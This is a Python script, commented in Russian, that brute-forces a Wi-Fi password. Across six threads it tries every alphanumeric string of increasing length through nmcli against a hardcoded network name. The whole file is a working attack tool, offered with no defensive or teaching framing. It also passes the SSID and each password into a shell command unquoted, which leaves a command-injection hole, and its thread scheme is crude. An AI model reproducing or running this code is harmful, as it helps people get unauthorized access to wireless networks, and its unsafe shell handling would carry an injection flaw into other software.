import itertools
import string
import threading
import time
import subprocess

# Функция для проверки пароля
def check_password(ssid, password):
    try:
        # Используем команду для подключения к Wi-Fi
        command = f"nmcli dev wifi connect {ssid} password {password}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        
        # Если пароль верный, выводим его
        if "successfully" in result.stdout:
            print(f"Пароль найден: {password}")
            return True
    except Exception as e:
        print(f"Ошибка при проверке пароля: {e}")
    return False

# Функция для генерации и проверки паролей в потоке
def brute_force_thread(ssid, start, end):
    for length in range(start, end):
        for guess in itertools.product(string.ascii_letters + string.digits, repeat=length):
            password = ''.join(guess)
            if check_password(ssid, password):
                return

# Основная функция
def main():
    ssid = "TP-Link_BB78" # Замените на имя вашей Wi-Fi сети
    num_threads = 6
    chunk_size = 5  # Размер диапазона для каждого потока

    threads = []
    for i in range(num_threads):
        start = i * chunk_size + 1
        end = start + chunk_size
        thread = threading.Thread(target=brute_force_thread, args=(ssid, start, end))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
